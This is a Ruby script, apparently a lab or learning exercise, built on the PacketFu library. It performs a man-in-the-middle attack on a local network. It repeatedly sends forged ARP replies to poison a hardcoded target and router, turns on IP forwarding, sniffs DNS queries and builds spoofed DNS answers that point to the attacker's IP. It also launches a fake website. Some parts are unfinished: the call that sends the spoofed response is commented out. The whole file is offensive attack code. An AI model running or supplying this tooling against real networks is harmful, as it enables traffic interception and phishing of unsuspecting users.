#!/usr/bin/env ruby

require 'packetfu'
require 'thread'

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread. 


## User defined variables
@target_ip   = "192.168.1.66"  # IP of the host you would like to target
@target_mac  = "bc:f5:ac:e2:c6:28"
@sender_ip   = "192.168.1.79"  # Your IP, or the attacking IP (MITM)
@sender_mac  = "7c:7a:91:7d:2b:02"
@router_ip   = "192.168.1.254"    # IP of the router on the network to ARP Poison
@router_mac  = "ec:43:f6:49:a3:96"
@iface       = "wlp2s0"         # Name of the primary network interface 

## DO NOT EDIT BELOW THIS LINE
# Functions
def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "ARP Posioning Thread Started"
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@iface)
    arp_packet_router.to_w(@iface)
  end
end

def get_machine_addr(ip)
  PacketFu::Utils.arp(ip, :iface => @iface)
end

def spoof_dns(t_ip)
  puts "DNS Spoofing Thread Started"
  #look for dns packets from target
  #filter = "udp and port 53 and src " + t_ip
  filter = "udp and port 53"

  begin
  cap = PacketFu::Capture.new(:iface => @iface,
    :start => true,
    :promisc => true,
    :filter=> filter)
  cap.stream.each do |p|
    pkt = PacketFu::Packet.parse(p)
    if pkt.is_udp?
      #dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s
      #puts dns_hdr_flag.unpack('h*')
      dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr

      #check if query
      if dns_hdr_flag == '10'
        puts pkt.payload
        domain_name = extract_domain(pkt.payload[12..-1])

        puts "Domain name is: #{domain_name}"

        #build and send response
        #send_dns_response(pkt, domain_name)
      end
    end
  end
  rescue Exception => ex
    puts "something bad happening in dns"
    puts ex.message
    puts ex.backtrace
  end
end

def extract_domain(q_name)
  #take q name and extract all subdomains
  domain_name = ""
=begin
  puts "length: #{q_name.length}"
  puts q_name[0].unpack('U*')
  puts q_name[1]
  puts q_name[2]
  puts q_name[3]
  puts q_name[4].unpack('U*')
  puts q_name[5]
  puts q_name[6]
  puts q_name[7]
  puts q_name[8]
  puts q_name[9]
  puts q_name[10]
  puts q_name[11]
  puts q_name[12]
  puts q_name[13]
  puts q_name[14]
  puts q_name[15]
  puts q_name[16]
  puts q_name[17]
  puts q_name[18]
  puts q_name[19]
  puts q_name[20]
  puts q_name[21]
  puts q_name[22]
  puts q_name[23]
  puts q_name[24]
  puts q_name[25]
  puts q_name[26].unpack('U*')
  puts q_name[27]
  puts q_name[28]
  puts q_name[29]
  puts q_name[30].unpack('U*')
  puts q_name[31]
  puts q_name[32]
=end

  domain_name = ""
  n = 0
  loop {
    puts "#{q_name[n].unpack('U*')} + #{q_name[n].class}"
    if q_name[n].unpack('H*') == ["00"]
      return domain_name
    elsif q_name[n].is_a? Integer
      puts "int"
      domain_name += '.'
      n += 1
    else
      domain_name += q_name[n]
      n += 1
    end 
  }
=begin
  puts "starting extract domain name: #{q_name}" 
  name = ""
  loop {
    puts "qname: #{q_name[0].unpack('n')}"
    len = q_name[0].to_i
    if len == 0
      name = name[0, name.length - 1]
      return name
    elsif len > 0
        len > 0
      name += q_name[1, len] + "."
      q_name = q_name[len + 1..-1]
    else len < 0 # should never be negative
      return nil
    end
  }
=end
end

def send_dns_response(orig_pkt, name)

  #UDP/IP headers
  dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
  dns_resp.eth_saddr = @sender_mac
  dns_resp.eth_daddr = @target_mac
  dns_resp.udp_dst   = orig_pkt.udp_src
  dns_resp.udp_src   = orig_pkt.udp_dst
  dns_resp.ip_saddr  = orig_pkt.ip_daddr
  dns_resp.ip_daddr  = @target_ip

  #DNS header
  #copy transaction ID from original query to response
=begin
  transID1 = orig_pkt.payload[0].unpack('H*')[0]
  transID2 = orig_pkt.payload[1].unpack('H*')[0]
  transID = transID1.hex.chr + transID2.hex.chr
  dns_resp.payload = transID
=end
  dns_resp.payload = orig_pkt.payload[0,2]
  dns_resp.payload += "\x85\x80" + "\x00\x01\x00\x02" + "\x04\x00\x00\x04" #may need to edit this

  #Domain Name
  name.split('.').each do |part|
    dns_resp.payload += part.length.chr
    dns_resp.payload += part
  end

  #Rest of DNS Header (defaults from notes)
  dns_resp.payload += "\x00\x00\x01"+"\x00\x01"+"\xc0\x0c\x00\x05"+"\x00\x01\x00\x02\xa3\x00\x04" #may need to edit this


  #Spoofed IP
  ip_ary = @sender_ip.split('.')
  dns_resp.payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')

  #Bundle and send
  dns_resp.recalc
  dns_resp.to_w(@iface)
end

## Main

=begin doesnt seem to be working consistently enough
@target_mac = get_machine_addr(@target_ip)
@sender_mac = get_machine_addr(@sender_ip)
@router_mac  = get_machine_addr(@router_ip)
=end

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr     = @sender_mac       # sender's MAC address
arp_packet_target.eth_daddr     = @target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = @sender_mac       # sender's MAC address
arp_packet_target.arp_daddr_mac = @target_mac       # target's MAC address
arp_packet_target.arp_saddr_ip  = @router_ip        # router's IP
arp_packet_target.arp_daddr_ip  = @target_ip        # target's IP
arp_packet_target.arp_opcode    = 2                 # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr     = @sender_mac       # sender's MAC address
arp_packet_router.eth_daddr     = @router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = @sender_mac       # sender's MAC address
arp_packet_router.arp_daddr_mac = @router_mac       # router's MAC address
arp_packet_router.arp_saddr_ip  = @target_ip        # target's IP
arp_packet_router.arp_daddr_ip  = @router_ip        # router's IP
arp_packet_router.arp_opcode    = 2                 # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
  puts "Starting the DNS spoofing thread..."
  dns_thread = Thread.new{spoof_dns(@target_ip)}
  puts "Starting the spoofed website thread..."
  web_thread = Thread.new{`ruby site.rb`} #probably a better way to run this in the code, but good enough
  spoof_thread.join
  dns_thread.join
  web_thread.join
rescue Interrupt # Catch the interrupt and kill the thread
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  puts "DNS spoof stopped by interrupt signal."
  Thread.kill(dns_thread)
  puts "Web spoof stopped by interrupt signal."
  Thread.kill(web_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end